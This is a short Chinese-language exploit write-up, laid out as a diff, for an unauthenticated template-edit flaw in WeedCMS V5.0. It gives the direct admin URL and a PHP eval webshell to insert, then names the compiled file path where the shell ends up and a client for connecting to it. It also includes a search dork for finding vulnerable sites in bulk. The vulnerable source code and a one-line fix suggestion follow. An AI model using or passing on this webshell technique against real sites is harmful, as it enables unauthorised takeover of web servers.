@@ -1,0 +1,50 @@
+新的是2011-1-1发的cms，WeedCMS V5.0。
+
+http://www.7747.net/admin.php?action=config&do=template_edit&file=part_vote.html
+
+构造好这个参数可以无验证直接访问 编辑模板 (part_vote.html) 块。
+
+插入 一句话马儿 <? eval($_POST[Insun]);?>   更新模块成功  然后访问一次首页缓存就生成出来了
+最后马儿就在 http://127.0.0.1/temps/compile/part_vote.html.php
+
+ 
+
+ 
+
+Fatal error: Using $this when not in object context 。$this 没有上下文，原因是没有对此类进行实例化。
+
+错误不要紧，用lanker链接下就行。
+
+建议大家不要破坏，清理痕迹。
+
+批量 powered by weedcms
+
+问题出现在includes/admin_config.php
+//编辑模板
+if($do=='template_edit'){
+ $file=empty($_GET['file'])?'':trim($_GET['file']);
+ if(get_ext($file)!='html'&&get_ext($file)!='css'){
+  exit('对不起，参数非法！');
+ }
+ $content=file_get_contents('templates/'.$config['site_template'].'/'.$file);
+ $smarty=new smarty();smarty_header();
+ $smarty->assign('file',$file);
+ $smarty->assign('content',$content);
+ $smarty->display('template_info.htm');
+}
+//删除更新
+if($do=='template_update'){
+ $file=empty($_POST['file'])?'':trim($_POST['file']);
+ $file='templates/'.$config['site_template'].'/'.$file;
+ $content=empty($_POST['content'])?'':trim($_POST['content']);
+ if(get_ext($file)=='html'){
+  clear_cache($file);
+ }
+ file_put_contents($file,$content);
+ message(array('text'=>$language['template_update_is_success'],'link'=>'?action=config&do=template_list'));
+}
+?>
+
+这2个操作没加验证，其他的if后面都有验证。修复加个验证
+
+还有个问题，这个cms 的install容易产生弱口令。不懂或图简单  会出问题
